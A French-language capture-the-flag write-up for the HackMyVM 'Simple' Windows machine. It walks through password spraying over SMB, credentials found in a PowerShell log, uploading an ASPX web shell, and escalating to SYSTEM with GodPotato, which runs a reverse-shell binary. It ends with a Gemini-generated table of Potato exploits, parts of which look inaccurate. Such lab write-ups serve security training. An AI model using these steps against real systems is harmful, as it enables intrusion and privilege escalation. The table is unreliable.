---
title: "Solution du CTF Simple de HackMyVM.eu"
tags: [CTF,HackMyVM,Windows]
---

### Date de consommation

Ce CTF m'a donné dsu fil à retordre parce que les comptes étaient expirés et ça ne faisait pas partie du scénario attendu.

```console
$ sudo nmap -T5 --script vuln -sCV -p- 192.168.56.114
Starting Nmap 7.94SVN ( https://nmap.org )
Pre-scan script results:
|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)
Nmap scan report for 192.168.56.114
Host is up (0.00030s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-IIS/10.0
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-dombased-xss: Couldn't find any DOM based XSS.
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:EC:A0:D8 (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 612.20 seconds
```

Sur le site web sur le port 80 on trouve une liste de pseudonymes correspondant à l'équipe de travail : `ruy`, `bogo`, etc.

Je note ces noms et je les mets dans un fichier.

Après avoir longuement énuméré la partie web sans trouver de fichiers ou dossiers utiles, je me porte vers le SMB.

J'ai utilisé NetExec pour essayer de casser les comptes. Après avoir utilisé une wordlist des 10000 passwords les plus communs, j'ai essayé les noms d'utilisateurs comme mot de passe avec la commande suivante :

```bash
nxc smb 192.168.56.114 -u users.txt -p users.txt
```

Parmi la liste un utilisateur avait un mort de passe faible. Toutefois son mot de passe est arrivé à expiration :

```console
$ nxc smb 192.168.56.114 -u bogo -p bogo
SMB         192.168.56.114  445    SIMPLE           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SIMPLE) (domain:Simple) (signing:False) (SMBv1:False) 
SMB         192.168.56.114  445    SIMPLE           [-] Simple\bogo:bogo STATUS_PASSWORD_EXPIRED 
```

J'ai essayé pas mal de choses en vain avec ce compte expiré. Il s'est avéré que la seule chose à faire s'était se connecter via l'interface semi-graphique de Windows Server et de faire le changement de mot de passe.

On avait alors la liste des partages :

```console
smbclient -U bogo -L //192.168.56.114
Password for [WORKGROUP\bogo]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Admin remota
        C$              Disk      Recurso predeterminado
        IPC$            IPC       IPC remota
        LOGS            Disk      
        WEB             Disk      
SMB1 disabled -- no workgroup available
```

Le partage LOGS est le seul accessible :

```console
smb: \> ls
  .                                   D        0  Sun Oct  8 23:23:36 2023
  ..                                  D        0  Sun Oct  8 23:23:36 2023
  20231008.log                        A     2200  Sun Oct  8 23:23:36 2023

                12966143 blocks of size 4096. 11102098 blocks available
```

Il s'agit d'un log Powershell et dedans on trouve des identifiants :

```console
PS C:\> net use \\127.0.0.1\WEB /user:marcos SuperPassword
Se ha completado el comando correctamente.
```

Pour cet autre utilisateur, rebelote : le mot de passe est expiré, il faut effectuer la même manipulation.

### Patates pas fraiches

Avec cet autre compte on peut cette fois accéder au partage WEB qui sans surprise correspond à ce qui est servit sur le port 80.

```console
$ smbclient -U marcos -L //192.168.56.114
Password for [WORKGROUP\marcos]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Admin remota
        C$              Disk      Recurso predeterminado
        IPC$            IPC       IPC remota
        LOGS            Disk      
        WEB             Disk      
SMB1 disabled -- no workgroup available
```

J'ai d'abord uploadé un shell ASP mais quand j'y accédais, je recevais une erreur 404.

Finalement, j'ai pris un shell ASPX ici et il s'est avéré être très bien :

```
https://github.com/xl7dev/WebShell/blob/master/Aspx/ASPX%20Shell.aspx
```

L'utilisateur qui fait tourner le service dispose du privilège `SeImpersonatePrivilege`.

```
INFORMACIàN DE USUARIO
----------------------

Nombre de usuario          SID                                                          
========================== =============================================================
iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415


INFORMACIàN DE GRUPO
--------------------

Nombre de grupo                             Tipo               SID          Atributos                                                               
=========================================== ================== ============ ========================================================================
Etiqueta obligatoria\Nivel obligatorio alto Etiqueta           S-1-16-12288                                                                         
Todos                                       Grupo conocido     S-1-1-0      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Usuarios                            Alias              S-1-5-32-545 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\SERVICIO                       Grupo conocido     S-1-5-6      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
INICIO DE SESIàN EN LA CONSOLA              Grupo conocido     S-1-2-1      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Usuarios autentificados        Grupo conocido     S-1-5-11     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY\Esta compa¤¡a                  Grupo conocido     S-1-5-15     Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\IIS_IUSRS                           Alias              S-1-5-32-568 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
LOCAL                                       Grupo conocido     S-1-2-0      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
                                            Tipo SID no v lido S-1-5-82-0   Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado


INFORMACIàN DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci¢n                                       Estado       
============================= ================================================= =============
SeAssignPrimaryTokenPrivilege Reemplazar un s¡mbolo (token) de nivel de proceso Deshabilitado
SeIncreaseQuotaPrivilege      Ajustar las cuotas de la memoria para un proceso  Deshabilitado
SeAuditPrivilege              Generar auditor¡as de seguridad                   Deshabilitado
SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido                  Habilitada   
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci¢n      Habilitada   
SeCreateGlobalPrivilege       Crear objetos globales                            Habilitada   
```

Je me suis tourné vers l'exploit JuicyPotato. Certains outils ont besoin d'un dossier sur lequel ils peuvent écrire et dans mon cas, c'était le dossier `c:\Logs` qui était world-writable.

J'ai essayé l'exploitation en passant quelques CLSID à l'exploit, aucun n'a fonctionné.

J'ai alors listé la totalité des CLSID du système avec ce script Powershell :

```console
> powershell.exe -ExecutionPolicy Bypass -File C:\inetpub\wwwroot\GetCLSID.ps1
Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation
----           ---------     --------- --------      ----                                               ---------------
HKCR                                   Registry      HKEY_CLASSES_ROOT                                                 
Looking for CLSIDs
Looking for APIDs
Joining CLSIDs and APIDs

PSPath            : Microsoft.PowerShell.Core\FileSystem::C:\Logs\Windows_Server_2019_Standard
PSParentPath      : Microsoft.PowerShell.Core\FileSystem::C:\Logs
PSChildName       : Windows_Server_2019_Standard
PSDrive           : C
PSProvider        : Microsoft.PowerShell.Core\FileSystem
PSIsContainer     : True
Name              : Windows_Server_2019_Standard
FullName          : C:\Logs\Windows_Server_2019_Standard
Parent            : Logs
Exists            : True
Root              : C:\
Extension         : 
CreationTime      : 16/06/2025 14:01:09
CreationTimeUtc   : 16/06/2025 12:01:09
LastAccessTime    : 16/06/2025 14:01:09
LastAccessTimeUtc : 16/06/2025 12:01:09
LastWriteTime     : 16/06/2025 14:01:09
LastWriteTimeUtc  : 16/06/2025 12:01:09
Attributes        : Directory
Mode              : d-----
BaseName          : Windows_Server_2019_Standard
Target            : {}
LinkType          : 


AppId        : {88283d7c-46f4-47d5-8fc2-db0b5cf0cb54}
LocalService : AppReadiness
CLSID        : {c980e4c2-c178-4572-935d-a8a429884806}


AppId        : {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
LocalService : BITS
CLSID        : {03ca98d6-ff5d-49b8-abc6-03dd84127020}


AppId        : {ab7c873b-eb14-49a6-be60-a602f80e6d22}
LocalService : defragsvc
CLSID        : {d20a3293-3341-4ae8-9aaf-8e397cb63c34}


AppId        : {42CBFAA7-A4A7-47BB-B422-BD10E9D02700}
LocalService : DiagnosticsHub.StandardCollector.Service
CLSID        : {42CBFAA7-A4A7-47BB-B422-BD10E9D02700}

--- snip ---

AppId        : {2568BFC5-CDBE-4585-B8AE-C403A2A5B84A}
LocalService : wisvc
CLSID        : {6150FC78-21A1-46A4-BF3F-897090C6D79D}


AppId        : {653C5148-4DCE-4905-9CFD-1B23662D3D9E}
LocalService : wuauserv
CLSID        : {b8fc52f5-cb03-4e10-8bcb-e3ec794c54a5}
```

Je les ai tous testé sans succès via un peu de Python. J'ai ensuite essayé PrintSpoofer mais il échouait aussi.

Finalement, j'ai utilisé [GodPotato](https://github.com/BeichenDream/GodPotato), aussi mentionné sur HackTricks et ça a marché :

```console
C:\Logs>gp.exe -cmd c:\inetpub\wwwroot\rev6666.exe
[*] CombaseModule: 0x140709355061248
[*] DispatchTable: 0x140709357378800
[*] UseProtseqFunction: 0x140709356754080
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\984c819f-6db6-420b-a76f-0e7e9652aa4a\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00004c02-07e8-ffff-8f00-710a814d0824
[*] DCOM obj OXID: 0x54e2dab36a2e274a
[*] DCOM obj OID: 0x4d1a46a53c8e455e
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\Servicio de red
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 948 Token:0x860  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 108
```

Une nouvelle fois j'ai utilisé le reverse shell Golang du CTF [Quoted]({% link _posts/2025-06-13-Solution-du-CTF-Quoted-de-HackMyVM.md %}).

Depuis la console j'ai alors récupéré les deux flags :

```
c:\Users\Administrador\Desktop>type root.txt
SIMPLE{S31MP3R50N4T3PR1V1L363}
c:\Users\marcos\Desktop>type user.txt
SIMPLE{ASPXT0SH311}
```

### Sac à patates

J'ai questionné l'IA Gemini sur les différents exploits pour les tokens et lui ait fait cracher un tableau qui peut être utile :

| Nom de l'Exploit | Technique Principale / Vulnérabilité Exploitée                                                                                                                                                      | Versions Windows Généralement Affectées                                                        | Notes / Fiabilité                                                                                                                                                                                                                                         |
| ---------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Rotten Potato    | DCOM & RPC via BITS (Background Intelligent Transfer Service). Exploite la vulnérabilité de la communication NTLM avec `NT AUTHORITY\SYSTEM`.                                                       | Windows Server 2012 R2 et versions antérieures (y compris Windows 7, 8, Server 2008).          | Plus ancien et moins fiable sur les OS modernes. Nécessite `SeImpersonatePrivilege` ou `SeAssignPrimaryTokenPrivilege`.                                                                                                                                   |
| Juicy Potato     | Variante améliorée de Rotten Potato, utilisant de nombreux CLSIDs DCOM différents pour déclencher l'authentification `NT AUTHORITY\SYSTEM`.                                                         | Windows Server 2008 R2, 2012, 2012 R2, 2016. Windows 7, 8, 8.1, 10 (versions plus anciennes).  | Très populaire, mais sa fiabilité a diminué sur Windows 10 (post-1809) et Server 2019 en raison du durcissement DCOM et des correctifs. Peut être bloqué par les CLSIDs spécifiques ou les défenses EDR/AV. C'est ce que vous avez expérimenté.           |
| PrintSpoofer     | Abus du service Windows Print Spooler (service d'impression). Tire parti de la fonction `RpcAddPrinterDriver` pour charger une DLL arbitraire avec les privilèges `SYSTEM`.                         | Windows 10, Server 2016, Server 2019, Server 2022 (avant les patchs PrintNightmare et autres). | Souvent plus fiable que Juicy Potato sur les systèmes modernes. Si les patchs liés à PrintNightmare (CVE-2021-34527, etc.) sont installés, il peut ne pas fonctionner ou nécessiter des conditions spécifiques. C'est ce que vous avez aussi expérimenté. |
| RoguePotato      | Combine le concept de Rotten Potato avec une attaque de relais NTLM via Local NTLM Reflection pour contourner les défenses.                                                                         | Windows 10 (versions plus récentes), Server 2019 et au-delà.                                   | Conçu pour contourner les limitations des "Potatoes" plus anciens. Peut être plus complexe à configurer.                                                                                                                                                  |
| GodPotato        | La variante la plus récente et souvent la plus efficace. Utilise plusieurs techniques de coercition d'authentification (y compris des pipes nommés, HTTP, WCF, RAW) pour obtenir un token `SYSTEM`. | Windows 8 à Windows 11, et Windows Server 2012 à Windows Server 2022.                          | C'est celui qui a fonctionné pour vous ! Il est conçu pour être plus résilient face aux défenses et aux patchs des versions plus récentes de Windows.                                                                                                     |
